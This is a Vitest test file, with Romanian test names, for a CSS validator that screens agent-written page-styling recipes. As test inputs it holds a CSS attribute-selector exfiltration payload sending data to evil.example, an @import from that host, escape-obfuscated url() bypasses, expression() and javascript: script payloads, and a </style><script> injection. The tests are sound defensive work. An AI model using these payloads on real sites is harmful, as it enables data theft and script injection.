import { describe, expect, it } from "vitest";
import { decodeEscapes, MAX_CSS_CHARS, stripComments, validateCss } from "./css";
import type { RejectionRule } from "./result";

function rulesOf(css: string): RejectionRule[] {
  const result = validateCss(css);
  return result.ok ? [] : result.rejected.map((r) => r.rule);
}

describe("validateCss: ce trece", () => {
  it("CSS-ul obișnuit al unei rețete trece neschimbat", () => {
    const css = `
      ytd-reel-shelf-renderer, [aria-label="Shorts"] { display: none !important; }
      header nav > a:first-child { order: -1; font-size: 20px; }
      .card { background: #fff; color: rgb(20 20 20); border-radius: 8px; grid-template-columns: 1fr 2fr; }
      @media (max-width: 600px) { .sidebar { display: none; } }
      button::after { content: "{ nu e acoladă }"; }`;
    expect(validateCss(css)).toEqual({ ok: true, css });
  });

  it("gol e valid (rețeta fără CSS)", () => {
    expect(validateCss("")).toEqual({ ok: true, css: "" });
  });
});

describe("validateCss: ce încarcă din afară", () => {
  it("url() e respins, cu o bucată din context pentru agent", () => {
    const result = validateCss('input[value^="a"] { background: url(https://evil.example/?a) }');
    expect(result.ok).toBe(false);
    if (result.ok) return;
    expect(result.rejected[0]).toMatchObject({ rule: "css-url" });
    expect(result.rejected[0].excerpt).toContain("url(");
  });

  it.each([
    ["cu majuscule", "a { background: URL(x.png) }"],
    ["cu escape hex", "a { background: u\\72 l(x.png) }"],
    ["cu escape hex lung", "a { background: \\000075rl(x.png) }"],
    ["cu escape simplu", "a { background: u\\rl(x.png) }"],
    ["ascuns după un comentariu", "a { background: /* nimic */ url(x.png) }"],
    ["image-set fără url", 'a { background-image: image-set("x.png" 1x) }'],
    ["-webkit-image-set", 'a { background-image: -webkit-image-set("x.png" 1x) }'],
    ["în @font-face", "@font-face { font-family: X; src: url(x.woff2) }"],
  ])("url ascuns: %s", (_name, css) => {
    expect(rulesOf(css)).toEqual(["css-url"]);
  });

  it("@import e respins, și fără url()", () => {
    expect(rulesOf('@import "https://evil.example/a.css";')).toEqual(["css-import"]);
    expect(rulesOf('@\\69mport "a.css";')).toEqual(["css-import"]);
  });
});

describe("validateCss: ce rulează cod", () => {
  it.each([
    ["expression()", "a { width: expression(alert(1)) }", "css-expression"],
    ["javascript:", "a { background: javascript:alert(1) }", "css-script-url"],
    ["java script: cu spațiu", "a { x: java script:alert(1) }", "css-script-url"],
    ["-moz-binding", "a { -moz-binding: x }", "css-legacy-binding"],
    ["behavior:", "a { behavior: x }", "css-legacy-binding"],
  ] as const)("%s", (_name, css, rule) => {
    expect(rulesOf(css)).toContain(rule);
  });
});

describe("validateCss: interfața noastră e a noastră", () => {
  it.each([
    ["elementul-gazdă", "uishapeshifter-root { display: none }"],
    ["cu id", "#UiShapeshifter-host { opacity: 0 }"],
    ["elementele noastre", '[data-agent-id="mascot.bubble"] { display: none }'],
    [":host", ":host { display: none }"],
    ["::part", "x-y::part(panel) { display: none }"],
  ])("%s", (_name, css) => {
    expect(rulesOf(css)).toEqual(["css-our-interface"]);
  });
});

describe("validateCss: forma", () => {
  it("prea lung → un singur motiv, cu limita", () => {
    const result = validateCss("a{}".repeat(MAX_CSS_CHARS));
    expect(result.ok).toBe(false);
    if (result.ok) return;
    expect(result.rejected).toHaveLength(1);
    expect(result.rejected[0].message).toContain(String(MAX_CSS_CHARS));
  });

  it("acolade neînchise sau în plus", () => {
    expect(rulesOf("a { color: red")).toEqual(["css-unbalanced"]);
    expect(rulesOf("a { color: red } }")).toEqual(["css-unbalanced"]);
  });

  it("HTML amestecat în CSS (ex. </style>)", () => {
    expect(rulesOf("a { color: red } </style><script>")).toContain("css-html-tag");
  });

  it("strânge toate motivele, nu doar primul", () => {
    expect(rulesOf("@import 'a.css'; [data-agent-id] { background: url(x) }")).toEqual(
      expect.arrayContaining(["css-url", "css-import", "css-our-interface"]),
    );
  });

  it("motivele sunt în română, pentru agent", () => {
    const result = validateCss("a { background: url(x) }");
    expect(!result.ok && result.rejected[0].message).toMatch(/încarcă ceva din afara paginii/);
  });
});

describe("ajutoarele", () => {
  it("decodeEscapes citește escape-urile ca browserul", () => {
    expect(decodeEscapes("u\\72 l")).toBe("url");
    expect(decodeEscapes("\\000075")).toBe("u");
    expect(decodeEscapes("a\\:b")).toBe("a:b");
  });

  it("stripComments scoate și un comentariu neînchis", () => {
    expect(stripComments("a /* x */ b /* y")).toBe("a  b ");
  });
});
